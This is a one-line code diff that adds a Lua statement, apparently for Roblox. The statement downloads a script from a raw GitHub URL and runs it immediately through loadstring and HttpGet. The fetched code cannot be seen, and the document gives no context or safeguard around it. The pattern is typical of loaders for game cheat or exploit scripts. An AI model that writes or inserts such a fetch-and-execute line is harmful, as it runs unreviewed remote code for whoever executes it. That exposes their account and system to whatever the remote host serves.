@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/1x2x3/Kanye/main/loadstring.lua'))();
